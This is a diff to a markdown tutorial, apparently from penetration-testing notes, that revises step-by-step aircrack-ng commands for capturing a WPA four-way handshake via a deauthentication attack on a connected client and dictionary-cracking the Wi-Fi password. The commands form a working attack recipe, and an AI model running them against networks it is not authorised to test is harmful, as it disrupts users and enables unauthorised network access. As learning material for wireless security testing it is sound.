@@ -5,24 +5,39 @@ Using just the `aircrack-ng` suite of tools to crack the secret.
 ## Commands
 
 * Run [setup](../../setup.md) first
+* Two terminals are needed
+* At least on client associated with the AP
 
 ```bash
-# Start monitor mode
+# [Terminal One]
+# Set interface to monitor mode
 sudo airmon-ng start $INTERFACE
 
-# Start monitor mode but with filters and output saved to PCAP.
+# Start monitoring - make terminal large enough to see everything
 sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap $INTERFACE
 
-# Do one deauth injection attack while still monitoring
-sudo aireplay-ng -0 1 -a $BSSID -c $CLIENT $INTERFACE
+# [Terminal Two]
+# Run the deauthentication attack to get four-way handshake
+sudo aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE
 
 # Wait for the four-way handshake to appear in airodump-ng window.
+
+```
+![four-way](../../images/fourway-handshake.png)
+
+```bash
 # Stop airodump-ng when it appears
 qq
 
 # Crack the password
-sudo aircrack-ng -w $WORDLIST -b $BSSID -e $SSID $PCAP
+sudo aircrack-ng -0 -w $WORDLIST -b $BSSID -e $SSID $PCAP
 ```
+
+![four-way](../../images/cracked-password-wpa.png)
+
+* If password is not found:
+    * Make sure that a four-way handshake is captured
+    * Use a better password file
 
 ## References
 
